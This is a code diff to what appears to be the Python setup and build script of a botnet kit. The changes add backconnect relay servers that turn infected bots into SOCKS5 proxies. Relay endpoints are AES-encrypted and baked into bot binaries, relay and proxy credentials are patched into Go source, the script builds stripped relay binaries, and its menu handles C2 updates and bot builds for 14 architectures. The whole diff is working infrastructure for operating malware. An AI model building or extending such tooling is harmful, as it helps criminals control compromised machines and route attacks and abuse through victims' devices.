@@ -549,6 +549,64 @@ def update_bot_main_go(
     return True
 
 
+def update_proxy_credentials(bot_path: str, username: str, password: str):
+    """Update the default SOCKS5 proxy credentials in bot/config.go"""
+    config_go_path = os.path.join(bot_path, "config.go")
+
+    with open(config_go_path, "r") as f:
+        content = f.read()
+
+    content = re.sub(
+        r'var proxyUser\s*=\s*"[^"]*"',
+        lambda m: f'var proxyUser = "{username}"',
+        content,
+    )
+    content = re.sub(
+        r'var proxyPass\s*=\s*"[^"]*"',
+        lambda m: f'var proxyPass = "{password}"',
+        content,
+    )
+
+    with open(config_go_path, "w") as f:
+        f.write(content)
+
+
+def update_relay_config(base_path: str, magic_code: str):
+    """Update the relay server's baked-in auth key"""
+    relay_main = os.path.join(base_path, "relay", "main.go")
+    if not os.path.exists(relay_main):
+        return
+
+    with open(relay_main, "r") as f:
+        content = f.read()
+
+    content = re.sub(
+        r'var defaultAuthKey\s*=\s*"[^"]*"',
+        lambda m: f'var defaultAuthKey = "{magic_code}"',
+        content,
+    )
+
+    with open(relay_main, "w") as f:
+        f.write(content)
+
+
+def update_relay_endpoints(bot_path: str, enc_hex: str):
+    """Update the relay endpoints encrypted blob in bot/config.go"""
+    config_go_path = os.path.join(bot_path, "config.go")
+
+    with open(config_go_path, "r") as f:
+        content = f.read()
+
+    content = re.sub(
+        r'var rawRelayEndpoints, _ = hex\.DecodeString\("[^"]*"\)',
+        lambda m: f'var rawRelayEndpoints, _ = hex.DecodeString("{enc_hex}")',
+        content,
+    )
+
+    with open(config_go_path, "w") as f:
+        f.write(content)
+
+
 def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
     """Generate TLS certificates"""
     try:
@@ -596,12 +654,29 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
         return False
 
 
+def find_go() -> str:
+    """Find the Go binary, preferring /usr/local/go/bin/go over system PATH"""
+    candidates = ["/usr/local/go/bin/go", shutil.which("go")]
+    for go in candidates:
+        if go and os.path.isfile(go):
+            try:
+                result = subprocess.run(
+                    [go, "version"], capture_output=True, text=True
+                )
+                if result.returncode == 0:
+                    return go
+            except Exception:
+                continue
+    return "go"  # fallback
+
+
 def build_cnc(cnc_path: str) -> bool:
     """Build the CNC server"""
     try:
-        info("Building CNC server...")
+        go = find_go()
+        info(f"Building CNC server... ({go})")
         result = subprocess.run(
-            ["go", "build", "-ldflags=-s -w", "-o", "cnc", "."],
+            [go, "build", "-ldflags=-s -w", "-o", "cnc", "."],
             cwd=cnc_path,
             capture_output=True,
             text=True,
@@ -620,7 +695,44 @@ def build_cnc(cnc_path: str) -> bool:
 
         return True
     except FileNotFoundError:
-        error("Go not found. Please install Go 1.23+")
+        error("Go not found. Please install Go 1.24+")
+        return False
+
+
+def build_relay(base_path: str) -> bool:
+    """Build the relay server"""
+    try:
+        go = find_go()
+        info(f"Building relay server... ({go})")
+        relay_path = os.path.join(base_path, "relay")
+        result = subprocess.run(
+            [
+                go,
+                "build",
+                "-trimpath",
+                "-ldflags=-s -w -buildid=",
+                "-o",
+                "relay",
+                ".",
+            ],
+            cwd=relay_path,
+            capture_output=True,
+            text=True,
+        )
+
+        if result.returncode != 0:
+            error(f"Build failed: {result.stderr}")
+            return False
+
+        # Copy binary to main directory
+        src = os.path.join(relay_path, "relay")
+        dst = os.path.join(base_path, "relay_server")
+        shutil.copy2(src, dst)
+        info(f"Copied relay binary to {dst}")
+
+        return True
+    except FileNotFoundError:
+        error("Go not found. Please install Go 1.24+")
         return False
 
 
@@ -736,6 +848,20 @@ def print_summary(config: dict):
     print(
         f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
     )
+    relay_eps = config.get("relay_endpoints", [])
+    if relay_eps:
+        print(
+            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.BRIGHT_WHITE}{', '.join(relay_eps)}{Colors.RESET}"
+        )
+    else:
+        print(
+            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.DIM}None (use !socks <relay:port> at runtime){Colors.RESET}"
+        )
+    proxy_u = config.get("proxy_user", "vision")
+    proxy_p = config.get("proxy_pass", "vision")
+    print(
+        f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}"
+    )
     print()
 
     print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
@@ -754,6 +880,10 @@ def print_summary(config: dict):
         f"    Login Trigger:{Colors.GREEN} spamtec{Colors.RESET}            (split mode only)"
     )
     print(f"    Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
+    magic = config.get("magic_code", "<magic_code>")
+    print(
+        f"    Relay:        {Colors.GREEN}go build -o relay ./relay && ./relay -key {magic}{Colors.RESET}"
+    )
     print()
 
 
@@ -849,6 +979,24 @@ def print_menu():
         f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_MAGENTA}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}Relay Endpoints Update{Colors.RESET}                                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Add, change, or remove relay endpoints             {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Keep existing C2, magic code & certificates        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}└─{Colors.RESET} Rebuild bot binaries only                         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Adding/changing backconnect relay servers{Colors.RESET}      {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
         f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                                  {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
@@ -904,6 +1052,47 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
 
     print()
     success(f"C2: {c2_address} | Admin port: {admin_port}")
+
+    # Relay endpoints for backconnect SOCKS5 proxy
+    print(
+        f"\n{Colors.DIM}   Relay servers let bots backconnect for SOCKS5 without exposing the C2.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Deploy relay binary on a VPS: ./relay -key <magic_code> -cp 9001 -sp 1080{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Leave blank if you'll specify relay addresses at runtime via !socks.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.YELLOW}   If you don't know what this is, just press Enter to skip it.{Colors.RESET}\n"
+    )
+    relay_input = prompt(
+        "Relay endpoints (comma-separated host:port, or blank to skip)", ""
+    )
+    relay_endpoints = []
+    if relay_input.strip():
+        relay_endpoints = [r.strip() for r in relay_input.split(",") if r.strip()]
+    config["relay_endpoints"] = relay_endpoints
+    if relay_endpoints:
+        success(f"Relay endpoints: {', '.join(relay_endpoints)}")
+    else:
+        info("No pre-configured relay endpoints (use !socks <relay:port> at runtime)")
+
+    # Default SOCKS5 proxy credentials
+    print(
+        f"\n{Colors.DIM}   Default credentials for SOCKS5 proxy access.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Users connect with: relay_host:port:username:password{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Can be changed at runtime via !socksauth command.{Colors.RESET}\n"
+    )
+    proxy_user = prompt("Default proxy username", "vision")
+    proxy_pass = prompt("Default proxy password", "vision")
+    config["proxy_user"] = proxy_user
+    config["proxy_pass"] = proxy_pass
+    success(f"Proxy auth: {proxy_user}:{proxy_pass}")
 
     # Step 2: Security Tokens & AES Key
     print_step(2, 5, "Security Token & Key Generation")
@@ -1002,6 +1191,9 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         error("Failed to update CNC")
 
+    update_relay_config(base_path, magic_code)
+    success("Relay configured")
+
     if update_bot_main_go(
         bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
     ):
@@ -1014,6 +1206,23 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         warning("Failed to set debug mode")
 
+    # Update relay endpoints
+    if config.get("relay_endpoints"):
+        relay_blob = "\x00".join(config["relay_endpoints"])
+        enc_relay = aes_ctr_encrypt(relay_blob)
+        update_relay_endpoints(bot_path, enc_relay)
+        success(f"Relay endpoints configured ({len(config['relay_endpoints'])} endpoint(s))")
+    else:
+        # Clear relay endpoints (empty blob)
+        update_relay_endpoints(bot_path, "")
+        info("No relay endpoints configured")
+
+    # Update default proxy credentials
+    update_proxy_credentials(
+        bot_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
+    )
+    success(f"Proxy credentials: {config.get('proxy_user', 'vision')}:{config.get('proxy_pass', 'vision')}")
+
     # Step 5: Build
     print_step(5, 5, "Building Binaries")
 
@@ -1022,6 +1231,12 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
             success("CNC server built")
         else:
             warning("CNC build failed - build manually with: cd cnc && go build")
+
+    if confirm("Would you like to build the relay server?"):
+        if build_relay(base_path):
+            success("Relay server built")
+        else:
+            warning("Relay build failed - build manually with: go build -o relay ./relay")
 
     if confirm(
         "Would you like to build bot binaries? (14 architectures, takes a few mins)"
@@ -1144,10 +1359,19 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     else:
         error("Failed to update Bot")
 
+    update_relay_config(base_path, config["magic_code"])
+    success("Relay configured")
+
     if update_bot_debug_mode(bot_path, debug_enabled):
         success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
     else:
         warning("Failed to set debug mode")
+
+    if confirm("Would you like to build the relay server?"):
+        if build_relay(base_path):
+            success("Relay server built")
+        else:
+            warning("Relay build failed - build manually with: go build -o relay ./relay")
 
     if confirm("Would you like to build bot binaries? (takes a few mins)"):
         if build_bots(base_path):
@@ -1172,6 +1396,187 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
     )
     print()
+    warning("Deploy new bot binaries from bins/")
+    warning("Existing bots will NOT auto-update - redeploy required")
+    print()
+
+
+def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
+    """Update relay endpoints only - keep existing C2, magic code, certs"""
+
+    # Get existing config
+    info("Reading existing configuration...")
+    existing = get_current_config(bot_path, cnc_path)
+
+    if not existing.get("magic_code") or not existing.get("crypt_seed"):
+        error("Could not read existing configuration!")
+        error("Please run Full Setup first.")
+        return
+
+    print()
+    info(
+        f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}"
+    )
+    info(
+        f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
+    )
+
+    # Show current relay endpoints if any
+    config_go_path = os.path.join(bot_path, "config.go")
+    with open(config_go_path, "r") as f:
+        content = f.read()
+    match = re.search(
+        r'var rawRelayEndpoints, _ = hex\.DecodeString\("([0-9a-fA-F]*)"\)', content
+    )
+    current_hex = match.group(1) if match else ""
+    if current_hex:
+        try:
+            current_key = read_current_key(os.path.join(bot_path, "opsec.go"))
+            current_plain = aes_ctr_decrypt_with_key(current_hex, current_key).decode(
+                "utf-8", errors="replace"
+            )
+            current_list = [
+                e for e in current_plain.split("\x00") if e.strip()
+            ]
+            if current_list:
+                info(
+                    f"Current relay endpoints: {Colors.BRIGHT_WHITE}{', '.join(current_list)}{Colors.RESET}"
+                )
+            else:
+                info("Current relay endpoints: (none)")
+        except Exception:
+            info("Current relay endpoints: (could not decrypt)")
+    else:
+        info("Current relay endpoints: (none)")
+
+    print()
+
+    # Step 1: New relay endpoints
+    print_step(1, 2, "Relay Endpoints")
+
+    print(
+        f"{Colors.DIM}   Relay servers let bots backconnect for SOCKS5 without exposing the C2.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Deploy relay binary on a VPS: ./relay -key {existing.get('magic_code', '<magic_code>')}{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Enter as many endpoints as you need, comma-separated.{Colors.RESET}"
+    )
+    print(
+        f"{Colors.DIM}   Leave blank to remove all pre-configured relay endpoints.{Colors.RESET}\n"
+    )
+
+    relay_input = prompt(
+        "Relay endpoints (comma-separated host:port, or blank to clear)", ""
+    )
+    relay_endpoints = []
+    if relay_input.strip():
+        relay_endpoints = [r.strip() for r in relay_input.split(",") if r.strip()]
+
+    if relay_endpoints:
+        success(f"Relay endpoints ({len(relay_endpoints)}): {', '.join(relay_endpoints)}")
+    else:
+        info("All relay endpoints cleared (use !socks <relay:port> at runtime)")
+
+    # Show current proxy credentials
+    current_user_match = re.search(r'var proxyUser\s*=\s*"([^"]*)"', content)
+    current_pass_match = re.search(r'var proxyPass\s*=\s*"([^"]*)"', content)
+    current_user = current_user_match.group(1) if current_user_match else "vision"
+    current_pass = current_pass_match.group(1) if current_pass_match else "vision"
+
+    print(
+        f"\n{Colors.DIM}   Default SOCKS5 credentials — users connect with relay:port:user:pass{Colors.RESET}\n"
+    )
+    proxy_user = prompt("Proxy username", current_user)
+    proxy_pass = prompt("Proxy password", current_pass)
+    success(f"Proxy auth: {proxy_user}:{proxy_pass}")
+
+    # Step 2: Update & Build
+    print_step(2, 2, "Update & Build")
+
+    print(f"{Colors.DIM}   Re-encrypting relay config with fresh AES key...{Colors.RESET}\n")
+
+    # Generate new AES key
+    opsec_path = os.path.join(bot_path, "opsec.go")
+    crypto_path = os.path.join(base_path, "tools", "crypto.go")
+    old_key = read_current_key(opsec_path)
+    new_key, new_pairs = generate_random_key()
+    patch_opsec_key(opsec_path, new_pairs)
+    if os.path.exists(crypto_path):
+        patch_crypto_tool_key(crypto_path, new_pairs)
+    success(f"AES key randomized ({new_key.hex()[:16]}...)")
+
+    # Re-encrypt all existing blobs with new key
+    encrypt_config_blobs(config_go_path, old_key, new_key)
+    success("Sensitive string blobs re-encrypted")
+
+    # Patch relay endpoints
+    if relay_endpoints:
+        relay_blob = "\x00".join(relay_endpoints)
+        enc_relay = aes_ctr_encrypt(relay_blob)
+        update_relay_endpoints(bot_path, enc_relay)
+        success(f"Relay endpoints encrypted ({len(relay_endpoints)} endpoint(s))")
+    else:
+        update_relay_endpoints(bot_path, "")
+        info("Relay endpoints cleared")
+
+    # Patch relay binary auth key
+    update_relay_config(base_path, existing["magic_code"])
+    success("Relay auth key synced")
+
+    # Patch proxy credentials
+    update_proxy_credentials(bot_path, proxy_user, proxy_pass)
+    success(f"Proxy credentials: {proxy_user}:{proxy_pass}")
+
+    # Offer to rebuild
+    if confirm("Would you like to build the relay server?"):
+        if build_relay(base_path):
+            success("Relay server built")
+        else:
+            warning("Relay build failed - build manually with: go build -o relay ./relay")
+
+    if confirm("Would you like to build bot binaries? (takes a few mins)"):
+        if build_bots(base_path):
+            success("Bot binaries built")
+        else:
+            warning("Bot build had issues - check bins/")
+
+    # Summary
+    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
+    print(
+        f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ RELAY ENDPOINTS UPDATED!{Colors.RESET}"
+    )
+    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
+
+    if relay_endpoints:
+        print(
+            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.BRIGHT_WHITE}{', '.join(relay_endpoints)}{Colors.RESET}"
+        )
+    else:
+        print(
+            f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.DIM}(none){Colors.RESET}"
+        )
+    print(
+        f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_user}:{proxy_pass}{Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
+    )
+    print(
+        f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
+    )
+    print()
+    if relay_endpoints:
+        info(
+            f"Start relay with: ./relay -key {existing.get('magic_code', '<magic_code>')}"
+        )
+        info(
+            f"Connect with: curl --socks5 {relay_endpoints[0].split(':')[0]}:1080 -U {proxy_user}:{proxy_pass} http://target"
+        )
     warning("Deploy new bot binaries from bins/")
     warning("Existing bots will NOT auto-update - redeploy required")
     print()
@@ -1202,6 +1607,9 @@ def main():
     elif choice == "2":
         info("Starting C2 URL Update...")
         run_c2_update(base_path, cnc_path, bot_path)
+    elif choice == "3":
+        info("Starting Relay Endpoints Update...")
+        run_relay_update(base_path, cnc_path, bot_path)
     elif choice == "0":
         print("\nExiting.")
         sys.exit(0)
